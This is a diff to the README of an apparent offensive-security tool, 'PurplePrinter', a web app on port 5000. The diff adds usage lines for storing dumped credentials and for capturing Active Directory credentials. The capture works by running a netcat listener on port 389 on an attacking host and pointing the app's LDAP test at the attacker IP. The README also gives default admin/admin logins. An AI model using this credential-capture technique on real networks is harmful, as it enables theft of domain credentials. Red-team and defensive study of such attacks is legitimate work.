@@ -13,4 +13,6 @@ Use:</br>
 -cd PurplePrinter</br>
 -python3 purplerprinter.py</br>
 -Web Browser: http://IP:5000/</br>
+-Login page to save credentials from enumeration/discovery/browser dumps: http://IP:5000/login</br>
 -Default Credentials: admin/admin</br>
+-Capture Credentials: http://IP:5000/config, on attacking host "nc -lvnp 389", enter attacker IP in Active Directory IP Address field and select the Test button</br>
